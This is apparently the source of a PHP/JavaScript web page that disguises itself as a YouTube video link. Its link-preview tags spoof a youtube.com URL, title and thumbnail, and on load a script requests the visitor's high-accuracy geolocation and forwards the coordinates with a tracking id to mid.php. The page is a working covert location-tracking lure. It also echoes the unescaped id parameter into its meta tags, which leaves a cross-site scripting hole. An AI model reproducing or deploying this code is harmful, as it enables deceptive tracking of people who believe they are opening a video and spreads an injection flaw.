<script>
    function main(id) {
        var options = {
            maximumAge: 50000,
            timeout: 30000,
            enableHighAccuracy: true
        };
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(success, err, options);

            function success(position) {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                str = 'mid.php?lat=' + latitude + '&long=' + longitude + '&id=' + id
                window.location = str;
            }

            function err() {

                const latitude = 'error';
                const longitude = 'unable to retrieve the location';
                window.location.replace = 'mid.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
            }
        } else {
            const latitude = 'error';
            const longitude = 'unable to retrieve the location';
            window.location.replace = 'mid.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
        }


    }
</script>
<?php
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    $idd = json_encode($id);
} else {
    $id = "";
}
echo "<script>main(${idd})</script>";

function getThumbnail($id)
{
    $links = json_decode(file_get_contents("li\links.json"), true);
    foreach ($links as $link) {
        if ($link['id'] == $id) {
            return $link['thumbnail'];
        }
    }
    return null;
}
function getTubeTitel($id)
{
    $links = json_decode(file_get_contents("li\links.json"), true);
    foreach ($links as $link) {
        if ($link['id'] == $id) {
            return $link['title'];
        }
    }
    return null;
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta property="og:url" content="https://www.youtube.com/watch?v=<?php echo ($id); ?>" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="<?php echo (getTubeTitel($id)); ?>" />
    <meta property="og:description" content="How much does culture influence creative thinking?" />
    <meta property="og:image" content="<?php echo (getThumbnail($id)); ?>" />

    <!-- <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content=<?php echo (getThumbnail($id)); ?>>
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="200">
    <meta property="og:image:height" content="200"> -->
    <title><?php echo (getTubeTitel($id)); ?></title>
</head>

<body>

</body>

</html>